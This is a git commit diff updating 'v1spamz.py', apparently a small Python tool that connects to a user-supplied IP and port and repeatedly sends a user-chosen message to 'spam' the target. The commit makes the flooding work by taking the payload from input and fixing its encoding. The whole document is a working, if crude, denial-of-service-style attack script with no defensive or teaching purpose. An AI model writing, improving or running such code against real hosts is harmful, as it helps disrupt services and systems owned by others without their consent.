5d8146790040805b109e291da1409abd6055af82
V1 MoDzZz <67358940+V1MoDzZz@users.noreply.github.com>
2020-11-25 16:22:04 +0500

    Update v1spamz.py

--- v1spamz.py
+++ v1spamz.py
@@ -2,6 +2,7 @@ import socket
 import sys
 
 sys.ps1 = '\033[01;32m '
+
 print(sys.ps1)
 print('''
 
@@ -25,7 +26,7 @@ s = int(input("Enter the packet size: "))
 TCP_IP = IP1
 TCP_PORT = port1
 BUFFER_SIZE = s
-MESSAGE = 1000
+MESSAGE = input("Enter the message ya wanna spam: ")
 
 print("connecting...")
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -33,7 +34,7 @@ s.connect((TCP_IP, TCP_PORT))
 print("spamming "+TCP_IP)
 
 for i in range(int(T1)):
-    s.send(bytes(MESSAGE))
+    s.send(bytes(MESSAGE, 'UTF-8'))
     data = s.recv(BUFFER_SIZE)
     print('spamming '+TCP_IP)
 s.close()
